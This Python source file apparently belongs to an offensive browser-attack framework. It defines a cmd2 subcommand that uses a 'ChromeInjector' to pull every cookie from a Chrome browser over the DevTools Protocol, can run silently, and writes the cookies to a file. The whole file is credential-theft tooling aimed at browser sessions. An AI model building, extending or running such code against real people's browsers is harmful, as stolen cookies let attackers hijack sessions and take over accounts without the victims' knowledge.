import cmd2
import argparse
from cmd2 import CommandSet, with_argparser, with_category, with_default_category
from helperclass import helperclass
from helperclass.helperclass import HelperClass

# Get all cookies from browser via CI
_get_all_cookies_parser = cmd2.Cmd2ArgumentParser()
_get_all_cookies_parser.add_argument('-i', '--injector', required = True,
                                    choices_provider = HelperClass.get_injector_names,
                                    type=str, help='target ChromeInjector')
_get_all_cookies_parser.add_argument('-p', '--path', default = None, required = False,
                                type=str, help='path to outfile', completer=cmd2.Cmd.path_complete)
_get_all_cookies_parser.add_argument('-o', '--overwrite', action ='store_true', required = False,
                                        help='flag to overwrite previously written out file')
_get_all_cookies_parser.add_argument('-l', '--silent', action ='store_true', required = False,
                                        help='flag to execute silently and not print output')
_get_all_cookies_parser.add_argument('-e', '--timeout', default = None, type=int, required = False,
                                        help='timeout in seconds')
@cmd2.as_subcommand_to('exec', 'get_all_cookies', _get_all_cookies_parser)
def get_all_cookies(self, ns: argparse.Namespace):
    """Get all cookies via ChromeInjector"""
    ci = HelperClass.get_injector(ns.injector)
    if not ci:
        return
    cookies = ci.cdp_get_all_cookies(time=ns.timeout)
    HelperClass.write_out(ns.path, str(cookies), ns.overwrite)
    if not ns.silent and cookies:
        self._cmd.poutput(f"Response:\n{cookies}")